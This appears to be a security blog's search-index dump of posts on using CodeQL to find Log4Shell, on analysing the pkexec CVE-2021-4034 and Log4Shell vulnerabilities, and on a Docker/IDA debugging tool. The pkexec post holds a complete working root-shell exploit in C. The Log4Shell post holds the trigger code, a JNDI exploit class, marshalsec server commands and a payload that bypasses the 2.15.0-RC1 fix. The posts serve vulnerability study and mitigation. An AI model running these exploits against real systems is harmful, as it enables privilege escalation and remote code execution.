{"pages":[{"title":"Error 404 - Page Not Found","text":"Click me to return to home page","link":"/404.html"},{"title":"About Me","text":"Email: 4xpl0r3r@gmail.com Coming soon…","link":"/about/index.html"}],"posts":[{"title":"Using CodeQL to find out Log4j CVE-2021-44228","text":"Although there is a experimental CWE-020 query used for “Potential Log4J LDAP JNDI injection (CVE-2021-44228)” already, but at this time, I want to refit the CWE-074 to make it could find out CVE-2021-44228 This article is also available in 简体中文. IntroductionAs we all know, Log4j is caused by user-controlled JNDI lookup, from the document, I found CodeQL query help covered it and it’s CWE number is CWE-074. Here is the doc: JNDI lookup with user-controlled name Let’s walk through this CWEs and try to use it to find the Log4j CVE-2021-44228 Interpret the CWE-074The CWE-074 Code: https://github.com/github/codeql/blob/main/java/ql/src/Security/CWE/CWE-074/JndiInjection.ql As we can see, it encapsulated the mots code into semmle.code.java.security.JndiInjectionQuery By the comments in the code, we can know that this lib is used to provide taint tracking configurations to be used in JNDI injection queries. And in it, we can find that it requires 4 libs as following semmle.code.java.dataflow.FlowSources Provides classes representing various flow sources for taint tracking This is a basic lib for CodeQL semmle.code.java.frameworks.Jndi Provides classes and predicates for working with the Java JNDI API. semmle.code.java.frameworks.SpringLdap Provides classes and predicates for working with the Spring LDAP API. semmle.code.java.security.JndiInjection Provides classes and predicates to reason about JNDI injection vulnerabilities. It’s important for us, so we will analyze it Interpreter JndiInjection.qllClass DefaultJndiInjectionSinkIt invokes the internal experimental API, and in practice, I found that it could locate the JNDI lookup function This code written by myself as following works as same as the sinkNode invokes. 123456exists(MethodAccess ma, Method m | ma.getMethod() = m and this.asExpr() = ma.getAnArgument() and m.getDeclaringType().hasQualifiedName(&quot;javax.naming&quot;,&quot;Context&quot;) and m.hasName(&quot;lookup&quot;)) Class ConditionedJndiInjectionSinkThis class extends JndiInjectionSink and DataFlow::ExprNode, so it’s a Node and also a ExprNode. The codeql judge code is as bellow 1234567891011exists(MethodAccess ma, Method m | ma.getMethod() = m and ma.getArgument(0) = this.asExpr() and m.getDeclaringType().getASourceSupertype*() instanceof TypeLdapOperations | m.hasName(&quot;search&quot;) and ma.getArgument(3).(CompileTimeConstantExpr).getBooleanValue() = true or m.hasName(&quot;unbind&quot;) and ma.getArgument(1).(CompileTimeConstantExpr).getBooleanValue() = true ) Let’s divide it into 3 parts by the | operand . 1MethodAccess ma, Method m Firstly, there are a method access and a method. 123ma.getMethod() = m andma.getArgument(0) = this.asExpr() andm.getDeclaringType().getASourceSupertype*() instanceof TypeLdapOperations The method access accessed the m method and the sink as expression is the method access’ first argument and the method is Ldap operation 12345m.hasName(&quot;search&quot;) andma.getArgument(3).(CompileTimeConstantExpr).getBooleanValue() = trueorm.hasName(&quot;unbind&quot;) andma.getArgument(1).(CompileTimeConstantExpr).getBooleanValue() = true the method could be search and it’s third argument should be true at compile time or the method could be unbind and it’s first argument should be true at compile time What’s the meaning of this? Let’s check it in real code. TypeLdapOperations includes 2 classes org.springframework.ldap.core org.springframework.ldap So this is only for the condition with SpringFramework, but this time, I want to find out a more general conditional without any framework. However, it’s a good idea to analyze it next time. Class ProviderUrlJndiInjectionSinkAs the comment said, it could find out the sink about the provider URL. 1234/** * Tainted value passed to env `Hashtable` as the provider URL by calling * `env.put(Context.PROVIDER_URL, tainted)` or `env.setProperty(Context.PROVIDER_URL, tainted)`. */ 12345678910111213141516exists(MethodAccess ma, Method m | ma.getMethod() = m and ma.getArgument(1) = this.getExpr()| m.getDeclaringType().getASourceSupertype*() instanceof TypeHashtable and (m.hasName(&quot;put&quot;) or m.hasName(&quot;setProperty&quot;)) and ( ma.getArgument(0).(CompileTimeConstantExpr).getStringValue() = &quot;java.naming.provider.url&quot; or exists(Field f | ma.getArgument(0) = f.getAnAccess() and f.hasName(&quot;PROVIDER_URL&quot;) and f.getDeclaringType() instanceof TypeNamingContext ) )) m.getDeclaringType().getASourceSupertype*() instanceof TypeHashtable means m Method should be sub of java.util.Hashtable. (m.hasName(&quot;put&quot;) or m.hasName(&quot;setProperty&quot;)) indicates the name of the method The final part indicates the first parameter should be a String java.naming.provider.url or a Field with type javax.naming.Context and the name should be PROVIDER_URL 123456789( ma.getArgument(0).(CompileTimeConstantExpr).getStringValue() = &quot;java.naming.provider.url&quot; or exists(Field f | ma.getArgument(0) = f.getAnAccess() and f.hasName(&quot;PROVIDER_URL&quot;) and f.getDeclaringType() instanceof TypeNamingContext )) So, obviously, if the user input could only control the provider URL, this query still could locate it. Class DefaultJndiInjectionAdditionalTaintStep A set of additional taint steps to be considered for taint tracking JNDI injection related data flows, in order to avoid taint tracking breaks when invoking third-party packages. nameStep(node1, node2) holds if n1 to n2 is a dataflow step that converts between String and CompositeName or CompoundName by calling new CompositeName(tainted) or new CompoundName(tainted). nameAddStep(node1, node2) holds if n1 to n2 is a dataflow step that converts between String and CompositeName or CompoundName by calling new CompositeName().add(tainted) or new CompoundName().add(tainted). jmxServiceUrlStep(node1, node2) holds if n1 to n2 is a dataflow step that converts between String and JMXServiceURL by calling new JMXServiceURL(tainted). jmxConnectorStep(node1, node2) holds if n1 to n2 is a dataflow step that converts between JMXServiceURL and JMXConnector by calling JMXConnectorFactory.newJMXConnector(tainted). rmiConnectorStep(node1, node2) holds if n1 to n2 is a dataflow step that converts between JMXServiceURL and RMIConnector by calling new RMIConnector(tainted). Interpreter JndiInjectionQuery.qllNow, let’s advance to the “query” lib, here contains some information about how to perform global taint tracking. Class JndiInjectionFlowConfig123456789101112131415class JndiInjectionFlowConfig extends TaintTracking::Configuration { JndiInjectionFlowConfig() { this = &quot;JndiInjectionFlowConfig&quot; } override predicate isSource(DataFlow::Node source) { source instanceof RemoteFlowSource } override predicate isSink(DataFlow::Node sink) { sink instanceof JndiInjectionSink } override predicate isSanitizer(DataFlow::Node node) { node.getType() instanceof PrimitiveType or node.getType() instanceof BoxedType } override predicate isAdditionalTaintStep(DataFlow::Node node1, DataFlow::Node node2) { any(JndiInjectionAdditionalTaintStep c).step(node1, node2) }} It applied the JndiInjectionSink as the Sink to track isSanitizer defines the condition that the result should be removed, in this case, if the node is a primitiveType or a BoxedType (Wrapped primitiveType), it will be removed. isAdditionalTaintStep adds additional taint steps, in this case, it uses JndiInjectionAdditionalTaintStep, while using this lib, the any filter indicates that we will any available subclass and here we will use class DefaultJndiInjectionAdditionalTaintStep which has been interpreted. Class UnsafeSearchControlsSink A method that does a JNDI lookup when it receives a SearchControls argument with setReturningObjFlag = true This class defined the unsafe search controls sink 12345exists(UnsafeSearchControlsConf conf, MethodAccess ma | conf.hasFlowTo(DataFlow::exprNode(ma.getAnArgument()))| this.asExpr() = ma.getArgument(0)) As we can see, it requires UnsafeSearchControlsConf, it defines the source and the sink of the flow, the source should be UnsafeSearchControls and the sink should be UnsafeSearchControlsArgument. UnsafeSearchControls: A SearchControls object with setReturningObjFlag = true. https://docs.oracle.com/javase/8/docs/api/javax/naming/directory/SearchControls.html setReturningObjFlag enables/disables returning objects returned as part of the result. UnsafeSearchControlsArgument: An argument of type SearchControls of an LdapOperations.search or DirContext.search call. So the sink should be a method access’ first argument and one of the method access ‘ arguments will be flowed in following the rule defined in UnsafeSearchControlsConf. Test JndiInjection.ql with Java codeJndiInjection.ql just simply invoked path query with JndiInjectionFlowConfig. Here is the test code and part of it is extracted from the official demo. 123456789101112131415161718192021222324public void doGet(HttpServletRequest request, HttpServletResponse response) { System.setProperty(&quot;com.sun.jndi.rmi.object.trustURLCodebase&quot;,&quot;true&quot;); // necessary for Java 8 String name = request.getParameter(&quot;name&quot;); Hashtable&lt;String, String&gt; env = new Hashtable&lt;String, String&gt;(); env.put(Context.INITIAL_CONTEXT_FACTORY, &quot;com.sun.jndi.rmi.registry.RegistryContextFactory&quot;); env.put(Context.PROVIDER_URL, &quot;rmi://127.0.0.1:1099&quot;); // Match ProviderUrlJndiInjectionSink InitialContext ctx = null; try { ctx = new InitialContext(env); // BAD: User input used in lookup ctx.lookup(name); // GOOD: The name is validated before being used in lookup// if (isValid(name)) {// ctx.lookup(name);// } else {// // Reject the request// } } catch (NamingException e) { throw new RuntimeException(e); }} 1java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer http://127.0.0.1:4444/\\#Exploit 1099 12jdk8codeql database create cwe074-test --language=java --source-root=/Users/kano/Workspace/IdeaProjects/demo12 We got the expected result. Verify the previous analysis with Quick evaluation DefaultJndiInjectionSink located String name = request.getParameter(&quot;name&quot;); ProviderUrlJndiInjectionSink located env.put(Context.PROVIDER_URL, &quot;rmi://127.0.0.1:1099&quot;); Excellent, this query works very well. Advance to Log4j CVE-2021-44228Introduce org.apache.logging.log4j-2.14.1 which you can find here Prepare the database for CodeQLAfter configuring the toolchains-sample-*.xml, we can get the CodeQL database. For better performance, we can exclude useless projects in modules section. 123456789101112131415161718192021222324252627282930313233343536&lt;modules&gt; &lt;module&gt;log4j-api-java9&lt;/module&gt; &lt;module&gt;log4j-api&lt;/module&gt; &lt;module&gt;log4j-core-java9&lt;/module&gt; &lt;module&gt;log4j-core&lt;/module&gt; &lt;!-- &lt;module&gt;log4j-layout-template-json&lt;/module&gt; &lt;module&gt;log4j-core-its&lt;/module&gt; &lt;module&gt;log4j-1.2-api&lt;/module&gt; &lt;module&gt;log4j-slf4j-impl&lt;/module&gt; &lt;module&gt;log4j-slf4j18-impl&lt;/module&gt; &lt;module&gt;log4j-to-slf4j&lt;/module&gt; &lt;module&gt;log4j-jcl&lt;/module&gt; &lt;module&gt;log4j-flume-ng&lt;/module&gt; &lt;module&gt;log4j-taglib&lt;/module&gt; &lt;module&gt;log4j-jmx-gui&lt;/module&gt; &lt;module&gt;log4j-samples&lt;/module&gt; &lt;module&gt;log4j-bom&lt;/module&gt; &lt;module&gt;log4j-jdbc-dbcp2&lt;/module&gt; &lt;module&gt;log4j-jpa&lt;/module&gt; &lt;module&gt;log4j-couchdb&lt;/module&gt; &lt;module&gt;log4j-mongodb3&lt;/module&gt; &lt;module&gt;log4j-mongodb4&lt;/module&gt; &lt;module&gt;log4j-cassandra&lt;/module&gt; &lt;module&gt;log4j-web&lt;/module&gt; &lt;module&gt;log4j-perf&lt;/module&gt; &lt;module&gt;log4j-iostreams&lt;/module&gt; &lt;module&gt;log4j-jul&lt;/module&gt; &lt;module&gt;log4j-jpl&lt;/module&gt; &lt;module&gt;log4j-liquibase&lt;/module&gt; &lt;module&gt;log4j-appserver&lt;/module&gt; &lt;module&gt;log4j-osgi&lt;/module&gt; &lt;module&gt;log4j-docker&lt;/module&gt; &lt;module&gt;log4j-kubernetes&lt;/module&gt; &lt;module&gt;log4j-spring-boot&lt;/module&gt; &lt;module&gt;log4j-spring-cloud-config&lt;/module&gt; --&gt; &lt;/modules&gt; 1codeql database create log4j-db -l java -s logging-log4j2-rel-2.14.1/ -c './mvnw clean install -t toolchains-sample-mac.xml -Dmaven.test.skip=true' Locate the sourceThrough debugging, we can know that the user input source is located in the various log functions in log4j-api/src/main/java/org/apache/logging/log4j/spi/AbstractLogger.java, like debug, info,error, and all of them will invoke logIfEnabled with “message” or “messageSupplier” parameter as log message. So the source should be like this 123456789class Log4jFlowSource extends DataFlow::Node{ Log4jFlowSource(){ this.asParameter().getCallable().hasName(&quot;logIfEnabled&quot;) and ( this.asParameter().hasName(&quot;message&quot;) or this.asParameter().hasName(&quot;messageSupplier&quot;) ) }} And we need a new TaintTracking::Configuration 12345678910111213141516171819class JndiInjectionFlowConfigInLog4j extends TaintTracking::Configuration{ JndiInjectionFlowConfigInLog4j() { this = &quot;JndiInjectionFlowConfigInLog4j&quot; } override predicate isSource(DataFlow::Node source) { source instanceof Log4jFlowSource } override predicate isSink(DataFlow::Node sink) { sink instanceof JndiInjectionSink } override predicate isSanitizer(DataFlow::Node node) { node.getType() instanceof PrimitiveType or node.getType() instanceof BoxedType } override predicate isAdditionalTaintStep(DataFlow::Node node1, DataFlow::Node node2) { any(JndiInjectionAdditionalTaintStep c).step(node1, node2) }}from DataFlow::PathNode source, DataFlow::PathNode sink, JndiInjectionFlowConfigInLog4j confwhere conf.hasFlowPath(source, sink)select sink.getNode(), source, sink, &quot;JNDI lookup might include name from $@.&quot;, source.getNode(), &quot;this user input&quot; Just changed the isSource part and the other remains the same as JndiInjectionFlowConfig. Run this query, we got this Lucky! We successfully find a path proved that the user input could be passed to JNDI lookup. Full code is shown as bellow. 12345678910111213141516171819202122232425262728293031323334353637383940414243444546/** * @name JNDI lookup with user-controlled name in Log4j Lib * @description Performing a JNDI lookup with a user-controlled name can lead to the download of an untrusted * object and to execution of arbitrary code. * @kind path-problem * @problem.severity error * @security-severity 9.8 * @precision high * @id java/jndi-injection * @tags security * external/cwe/cwe-074 */import javaimport semmle.code.java.security.JndiInjectionQueryimport DataFlow::PathGraphclass JndiInjectionFlowConfigInLog4j extends TaintTracking::Configuration{ JndiInjectionFlowConfigInLog4j() { this = &quot;JndiInjectionFlowConfigInLog4j&quot; } override predicate isSource(DataFlow::Node source) { source instanceof Log4jFlowSource } override predicate isSink(DataFlow::Node sink) { sink instanceof JndiInjectionSink } override predicate isSanitizer(DataFlow::Node node) { node.getType() instanceof PrimitiveType or node.getType() instanceof BoxedType } override predicate isAdditionalTaintStep(DataFlow::Node node1, DataFlow::Node node2) { any(JndiInjectionAdditionalTaintStep c).step(node1, node2) }}class Log4jFlowSource extends DataFlow::Node{ Log4jFlowSource(){ this.asParameter().getCallable().hasName(&quot;logIfEnabled&quot;) and ( this.asParameter().hasName(&quot;message&quot;) or this.asParameter().hasName(&quot;messageSupplier&quot;) ) }}from DataFlow::PathNode source, DataFlow::PathNode sink, JndiInjectionFlowConfigInLog4j confwhere conf.hasFlowPath(source, sink)select sink.getNode(), source, sink, &quot;JNDI lookup might include name from $@.&quot;, source.getNode(), &quot;this user input&quot; ReferencesCodeQL CWE Coverage: https://codeql.github.com/codeql-query-help/codeql-cwe-coverage/ CodeQL query help for Java: https://codeql.github.com/codeql-query-help/java/ CodeQL Repository: https://github.com/github/codeql/tree/main/java/ql/src/Security/CWE","link":"/Experience/Using-CodeQL-to-find-out-Log4j-CVE-2021-44228/"},{"title":"Vulnerability-Analysis - CVE-2021-4034 Linux Polkit Privilege Escalation","text":"The major reference: Qualys’ Advisory This article is also available in 简体中文. Vulnerabilty Profile2022-01-25，The Exploit details of CVE-2021-4034 released, the vulnerabilty is found by Qualys Security Team in the pkexec , which is a component of the polkit suite. pkexec application is a tool to set uid, allowing a common user to execute a command as a privileged user according to a pre-defined policy. All mainstream Linux systems have this tool installed in default, and it’s executable has SUID bit set to work. All pkexec versions since the first version in May 2009 are vulnerable to this. The commit: Add a pkexec(1) command (c8c3d835) · Commits · polkit / polkit · GitLab Due to the widespread use of pkexec, the exploit of this vulnerability works in nearly all current Linux distributions with a wide range of effectiveness Vulnerabilty AnalysisPlease read the offical advisory: Qualys’ Advisory In summary, we need 2 environment variable to exploit the vulnerabilty. First one is set to a arbitrary string, such as x, the second one is set to PATH=GCONV_PATH=., which will be concat with /x and the command to execute will become GCONV_PATH=./x. After running GCONV_PATH=./x, we reintroduced an insecure environment which leads to privilege escalation. The ExploitI installed a Ubuntu 20.04, and found the version of its pkexec is 0.105, which is vulnerable. Firstly, we need to build a evil shared library, which is used to obtain the privileged shell. The code is as shown below 1234567#include &lt;stdlib.h&gt;#include &lt;unistd.h&gt;void gconv() {}void gconv_init() { setuid(0); seteuid(0); setgid(0); setegid(0); system(&quot;PATH=/bin:/usr/bin:/sbin /bin/sh&quot;);} Build it 1gcc -shared -fPIC payload.c -o payload.so The exploit the LC_MESSAGES is used to set the charset set the XAUTHORITY to a illegal value to skip the normal execution, we only need the log function to exploit the vulnerabilty. 1234567891011121314151617181920212223#include &lt;stdio.h&gt;#include &lt;unistd.h&gt;#include &lt;sys/stat.h&gt;int main() { char* _argv[]={ NULL }; char* _envp[]={ &quot;x&quot;, &quot;PATH=GCONV_PATH=.&quot;, &quot;LC_MESSAGES=en_US.UTF-8&quot;, &quot;XAUTHORITY=..&quot;, NULL }; mkdir(&quot;GCONV_PATH=.&quot;, 0777); mkdir(&quot;x&quot;, 0777); FILE *fp = fopen(&quot;x/gconv-modules&quot;, &quot;wb&quot;); fprintf(fp, &quot;module UTF-8// INTERNAL ../payload 2\\n&quot;); fclose(fp); fp = fopen(&quot;GCONV_PATH=./x&quot;, &quot;wb&quot;); fclose(fp); chmod(&quot;GCONV_PATH=./x&quot;,0777); execve(&quot;/usr/bin/pkexec&quot;, _argv, _envp);} Build it 1gcc exploit.c -o exp.out Run ./exp.out and you will get the privileged shell. Fix the VulnerabiltyThe modification: pkexec: local privilege escalation (CVE-2021-4034) (a2bf5c9c) · Commits · polkit / polkit · GitLab As we can see, if the value of argc is less than 1, the program will exit directly.","link":"/Vuln-Analysis/Vulnerability-Analysis-CVE-2021-4034-Linux-Polkit-Privilege-Escalation/"},{"title":"Vulnerability Analysis - CVE-2021-44228 Log4Shell","text":"Using Java 8u181 This article is also available in 简体中文. Vulnerability ProfileApache Log4j2 is a logging tool. Because Apache Log4j2 offers some functions that could parse recursively, an attacker can directly construct a malicious request to trigger the remote code execution.The vulnerability works with default configuration. Verified by the Ali Cloud security team, It is affected for Apache Struts2, Apache Solr, Apache Druid, Apache Flink, etc. All systems running Apache log4j2 2.0-beta9 through 2.14.1 are vulnerable. If the Java application imports the log4j-core, it is most likely to be affected. The ExploitThe Exploit CodeUse the maven to build a project to trigger the vulnerability and import the org.apache.logging.log4j module which version is 2.14.1 . If the logger uses a recordable level to log the payload , the vulnerability will be triggered. The trigger code is as shown below. 12345678import org.apache.logging.log4j.LogManager;import org.apache.logging.log4j.Logger;public class Main { private static final Logger logger = LogManager.getLogger(); public static void main(String[] args) { logger.error(&quot;${jndi:ldap://ip:1389/#Exploit}123&quot;); }} Use the code shown below to build a class file used by JNDI 123456789101112131415161718192021222324252627282930313233343536import java.io.BufferedReader;import java.io.IOException;import java.io.InputStream;import java.io.InputStreamReader;import java.io.Reader;public class Exploit{ public Exploit() throws IOException,InterruptedException{ String cmd=&quot;curl 127.0.0.1:5555&quot;; final Process process = Runtime.getRuntime().exec(cmd); printMessage(process.getInputStream());; printMessage(process.getErrorStream()); int value=process.waitFor(); System.out.println(value); } private static void printMessage(final InputStream input) { new Thread (new Runnable() { @Override public void run() { // TODO Auto-generated method stub Reader reader =new InputStreamReader(input); BufferedReader bf = new BufferedReader(reader); String line = null; try { while ((line=bf.readLine())!=null) { System.out.println(line); } }catch (IOException e){ e.printStackTrace(); } } }).start(); }} Compile the code to get the .class file. The construction method will be run by JNDI. Trigger the vulnerabilityIt’s typical JNDI Injection progress. Firstly, move the .class file to a web server, and then, make use of marshalsec to set up JNDI and LDAP service, the command is as shown below 1java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http://127.0.0.1:8080/#Exploit Analysis of the VulnerabiltyAnalysis of the source codeAs we all know, the exploit is working with JNDI, so we make a breakpoint in the constrution method of javax.naming.InitialContext . The source code is located in rt.jar/javax/naming/InitialContext.java After running the trigger code, the execution will be paused at the breakpoint. The calling stack is as shown below It’s obviously that if we want to exploit with JNDI, there must be a calling for lookup method, so let’s trace reversely form JndiLookup.look(). To determine where is the code that focus to the payload ${jndi:ldap://127.0.0.1:1389/#Exploit}, we can add some junk into the logging message. Running the trigger again, we can find that the substitute methond deferenced AAAAA${jndi:ldap://127.0.0.1:1389/#Exploit}BBBBB into ${jndi:ldap://127.0.0.1:1389/#Exploit}. Apart from this, we can find there is a method called resolveVariable which is using to parse variable wrapper with ${}. Keep tracing, we can find a piece of code as below We can find that if it meet the variable starting with ${, the code will replace it with the resolved variable. Going deeperLog4j2 has 3 major components. Logger - log the message Appender - output the message Layout - format the message Keep tracing the calling stack, we can find that log4j2 use LoggerConfig.processLogEvent() to resolve logging event, use callAppenders() to call Appender to ouput the message. The function of Appender is transfer the logging event to the target. There are some commonly used Appender such as ConsoleAppender(output to the console), FileAppender(output to a file). It will use AppenderControl to gain the specific Appender. In this debug session, it is ConsoleAppender. The Appender uses the Layout to get the logging format, formats the logging message with Layout.encode(). The Layout will use formatters to finish the formating. The inputted message is resolved by MessagePatternConverter.format(), it’s a important part of the vulnerabilty. When the config is exist and the noLookups is false, if there is a ${' in the message, it will call workingBuilder.append() to get the StrSubstitutor to replace the variable with resolved one We can find there is a noLookups which is a value of configuration, the default value of it is the false. We will make use of it to temporarily fix the vulnerabilty later. Going forward, we can find the StrSubstitutor.resolveVariable() , it is used to resolve and parse, suporting the protocols incluing JNDI as below Mitigation - Disable Lookups with System configuration We can check the cross reference to determine where the noLookups was assigned, it is as below As a example, I add a line of code to change the system configration, it could also be set by command line or .properties configration file. 12345678910 import org.apache.logging.log4j.LogManager;import org.apache.logging.log4j.Logger;import java.lang.*;public class Main { public static void main(String[] args) { System.setProperty(&quot;log4j2.formatMsgNoLookups&quot;,&quot;true&quot;); final Logger logger = LogManager.getLogger(); logger.error(&quot;AAAAA${jndi:ldap://127.0.0.1:1389/#Exploit}BBBBBB&quot;); }} Run the trigger code again, we can find that ${jndi:ldap://127.0.0.1:1389/#Exploit} won’t be parsed Mitigation - Disable Lookups with Log4j Configuration In my opinion, it’s the best way to protect the system without upgrading The official documet: Log4j – Configuring Log4j 2 (apache.org) The MVP(Minimum Viable Product) of configuration in XML is as shown below. 12345678910111213&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;Configuration&gt; &lt;Appenders&gt; &lt;Console name=&quot;Console&quot; target=&quot;SYSTEM_OUT&quot;&gt; &lt;PatternLayout pattern=&quot;[%t] %-5level %m{nolookups} %n&quot;/&gt; &lt;/Console&gt; &lt;/Appenders&gt; &lt;Loggers&gt; &lt;Root level=&quot;info&quot;&gt; &lt;AppenderRef ref=&quot;Console&quot;/&gt; &lt;/Root&gt; &lt;/Loggers&gt;&lt;/Configuration&gt; Apart from XML, the Log4j also support other formats such as json. Thinking - Why the Log4j2 needs the capability of JNDIAfter checking the official documents Log4j – Configuring Log4j 2 - Apache Log4j 2,I found the Property Substitution function, it offers the capability to retrieve attributes remotely to make the logging information more abundant Because the developers didn’t aware the potential harm, the default value of noLookups was set to false and the source of JNDI wasn’t been restricted. Something elseThe common false positiveMany tester determine if the system is vulnerable to the CVE-2021-44228 by checking the DNS request, it’s not rigorous. Many Public Service could send the DNS request for the domian in the payload to take spam intercepting or any else, so the DNS request can’t be the evidence of vulnerabilty. There is a better method to check, just insert the ${sys:java.version} into the subdomain, it will be much more accurate. How to defense Upgrade the log4j2 Disable Lookups with System configuration Disable Lookups with Log4j Configuration The official fixing https://logging.apache.org/log4j/2.x/changes-report.html As shown above, in Release 2.15.0, it disabled the lookups by default and limit the servers and classes that can be accessed via LDAP. What’s more, In release 2.16.0, disable JNDI by default. Require log4j2.enableJndi to be set to true to allow JNDI and completely remove support for Message Lookups. The Bypassing in log4j 2.15.0-RC1CompilingBecause the 2.15.0-RC1 don’t exist in the maven repository, we have to get the source code from GitHub and compile it manually. Tags · apache/logging-log4j2 (github.com) According to the README.md, configure the jdk in the toolschains files and we only need the packages for jdk1.8, so just comment out the others. Because we don’t need all the modules, modify the modules in pom.xml as shown below 12345678910111213141516171819202122232425262728293031323334353637&lt;modules&gt; &lt;!-- &lt;module&gt;log4j-api-java9&lt;/module&gt; --&gt; &lt;module&gt;log4j-api&lt;/module&gt; &lt;!-- &lt;module&gt;log4j-core-java9&lt;/module&gt; --&gt; &lt;module&gt;log4j-core&lt;/module&gt; &lt;!-- &lt;module&gt;log4j-layout-template-json&lt;/module&gt; &lt;module&gt;log4j-core-its&lt;/module&gt; &lt;module&gt;log4j-1.2-api&lt;/module&gt; &lt;module&gt;log4j-slf4j-impl&lt;/module&gt; &lt;module&gt;log4j-slf4j18-impl&lt;/module&gt; &lt;module&gt;log4j-to-slf4j&lt;/module&gt; &lt;module&gt;log4j-jcl&lt;/module&gt; &lt;module&gt;log4j-flume-ng&lt;/module&gt; &lt;module&gt;log4j-taglib&lt;/module&gt; &lt;module&gt;log4j-jmx-gui&lt;/module&gt; &lt;module&gt;log4j-samples&lt;/module&gt; &lt;module&gt;log4j-bom&lt;/module&gt; &lt;module&gt;log4j-jdbc-dbcp2&lt;/module&gt; &lt;module&gt;log4j-jpa&lt;/module&gt; &lt;module&gt;log4j-couchdb&lt;/module&gt; &lt;module&gt;log4j-mongodb3&lt;/module&gt; &lt;module&gt;log4j-mongodb4&lt;/module&gt; &lt;module&gt;log4j-cassandra&lt;/module&gt; &lt;module&gt;log4j-web&lt;/module&gt; &lt;module&gt;log4j-jakarta-web&lt;/module&gt; &lt;module&gt;log4j-perf&lt;/module&gt; &lt;module&gt;log4j-iostreams&lt;/module&gt; &lt;module&gt;log4j-jul&lt;/module&gt; &lt;module&gt;log4j-jpl&lt;/module&gt; &lt;module&gt;log4j-liquibase&lt;/module&gt; &lt;module&gt;log4j-appserver&lt;/module&gt; &lt;module&gt;log4j-osgi&lt;/module&gt; &lt;module&gt;log4j-docker&lt;/module&gt; &lt;module&gt;log4j-kubernetes&lt;/module&gt; &lt;module&gt;log4j-spring-boot&lt;/module&gt; &lt;module&gt;log4j-spring-cloud-config&lt;/module&gt; --&gt;&lt;/modules&gt; To compile, the maven command to run is as below 12# set the env variable JAVA_HOME to the path of jdk1.8./mvnw clean install -t toolchains-sample-mac.xml -Dmaven.test.skip=true # skip tests to accelerate The generated artifacts (.jar) will be in the target directory of every module. Analysis of the source codeFirstly, change the version of log4j to 2.15.0 in the pom.xml, replace the packages .jar with the generated before. Because it disabled the lookups by default in 2.15.0, we have to enable it with configuration. Modify or create the log4j2.xml 12345678910111213&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;Configuration&gt; &lt;Appenders&gt; &lt;Console name=&quot;Console&quot; target=&quot;SYSTEM_OUT&quot;&gt; &lt;PatternLayout pattern=&quot;[%t] %-5level %m{lookups} %n&quot;/&gt; &lt;/Console&gt; &lt;/Appenders&gt; &lt;Loggers&gt; &lt;Root level=&quot;info&quot;&gt; &lt;AppenderRef ref=&quot;Console&quot;/&gt; &lt;/Root&gt; &lt;/Loggers&gt;&lt;/Configuration&gt; Now, the payload as below will be parsed 1${sys:java.version} However, the payload for JNDI won’t be parsed 1${jndi:ldap://ip:1389/#Exploit} We know that the variable could be resolved but the JNDI has been restricted, let’s have a check with the process of variable resolving. Focus on StrSubstitutor.resolveVariable() Step into the lookup() We can find that the JNDI could be resolved as before, step into the lookup() again and check what is restricting the JNDI. Step into the lookup() of jndiManager We can find there are some restrictions about the protocol and source. As we found, the source has been restricted to some local IP, let’s assume that the restrict about source won’t afffect us as we are testing locally. Apart from this, we can find that the LDAP protocol is permitted. We can find that the Reference Object have been forbidden by attributeMap.get(OBJECT_FACTORY)!=null Apart from this, the another way to exploit with JNDI, deserialization, has been restricted too, it limited the classes to some basic type with allowedClasses as below Although it looks like perfect, but there is a vulnerability in the logic of exception handling If there is a URI with some error in syntax, it will skip all the assessment and execution will arrive the JNDI lookup.But, how to have a URI which have some error in syntax but could work as intended? Just add a space that didn’t encoded by urlencode as below 1${jndi:ldap://127.0.0.1:1389/# Exploit} Run the trigger code again, we can find that the command in exploit code works. Summary of the Bypassing The LookUps have to be enabled by developer The source of LDAP have to be in the permit list, but the permit list only contains some local address by default References Log4j Vulnerability (Log4Shell) Explained // CVE-2021-44228 - YouTube https://logging.apache.org/log4j/2.x/changes-report.html https://paper.seebug.org/1786/ https://www.anquanke.com/post/id/262668 Log4j – Configuring Log4j 2 (apache.org) https://xz.aliyun.com/t/10649#toc-2 JNDI with LDAP Serializable Objects (oracle.com) Referenceable Objects and References (oracle.com) https://www.icode9.com/content-4-1253127.html","link":"/Vuln-Analysis/Vulnerability-Analysis-CVE-2021-44228-Log4Shell/"},{"title":"DIPD Document","text":"4xpl0r3r/DIPD: Debug with IDA and Pwntools in Docker (DIPD) (github.com) This article is also available in 简体中文. AboutWith this, you can debug a program in docker and make use of both IDA and Pwntools SAFT QUICK POWERFUL(IDA) Get Started1git clone https://github.com/4xpl0r3r/DIPD.git Install docker, docker-compose, and IDA (You can deploy them in separated hosts, but the network between them must be OK) move the binary to debug/ directory and rename the binary to todebug run the command docker-compose up in the root directory of this project Access to the STDIO of binary 1nc docker.ip 23458 IDA Pro Debugger Arguments (version 7.6) Type: Remote Linux Debugger (Attach) Hostname: docker.ip (the IP of your host which running docker) Port: 23946 No password need Caution You have to run the binary by netcat or pwntools before attaching the process, or you can’t see the desired process in your IDA You have to run the docker in a 64bit arch Linux to support both 32bit(i386) and 64bit(amd64) debug DemoStart the DIPD 1docker-compose up Run and connect to the STDIO of your binary 1nc docker.ip 23458 Now, your binary should have been running Let’s use our IDA and start the IDA Debugger Input Information and click “OK” Now you can see the processes in your docker, choose ./todebug and click “OK” Now, you should have got into IDA debug view without any error and exception. file - docker-compose.ymlimageYou can choose the base image as you like, here are some useful options 1234i386/ubuntu:16.04i386/ubuntu:18.04amd64/ubuntu:16.04amd64/ubuntu:18.04 You have to run your docker in 64bit Arch to support both i386 and amd64, or the only option is i386 Other argumentsJust have a look at the annotation over there directory - filesdirectory - debsthe apt packages for socat, used for fast install and offline support files - linux_server[64]IDA Debug Server v7.6 If you don’t want to use IDA v7.6, just replace them with yours file - init.shThis file is used for initializing the debug environment, you can modify it to make any adjustment directory - debugJust place the binary you want to debug here If you have an application isn’t having only 1 ELF file, just copy them all to this directory If you don’t want to change the name of your elf file, you could change the argument debug_name in 